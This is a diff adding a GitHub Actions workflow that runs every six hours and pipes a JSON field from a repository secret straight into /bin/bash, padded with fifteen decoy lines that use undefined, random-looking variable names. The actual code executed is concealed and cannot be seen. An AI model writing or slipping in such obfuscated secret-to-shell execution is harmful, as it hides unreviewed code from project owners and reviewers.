@@ -1,0 +1,33 @@
+name: dilikongbai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dilikongbai
+        env:
+          ch798: ${{ secrets.ch798 }}
+        run: |
+          echo $ch798 | jq -r .beuai09 | /bin/bash
+          echo $x74777 | jq -r .ccbxl95 | /bin/bash
+          echo $ie104 | jq -r .iudg62 | /bin/bash
+          echo $tux9 | jq -r .vdxw15156 | /bin/bash
+          echo $vqr4262 | jq -r .vv2732 | /bin/bash
+          echo $uzcqv68199 | jq -r .rc72791 | /bin/bash
+          echo $lt30 | jq -r .irwp948 | /bin/bash
+          echo $n8 | jq -r .oa96824 | /bin/bash
+          echo $ryrzb5019 | jq -r .vger08 | /bin/bash
+          echo $iotvb1 | jq -r .ob3 | /bin/bash
+          echo $qq9 | jq -r .ba62 | /bin/bash
+          echo $xfczh4599 | jq -r .u971 | /bin/bash
+          echo $qyrhq77 | jq -r .y66 | /bin/bash
+          echo $efnbz0 | jq -r .mu60 | /bin/bash
+          echo $lrbqt62 | jq -r .gll922 | /bin/bash
+          echo $fdy761 | jq -r .nun18055 | /bin/bash
+
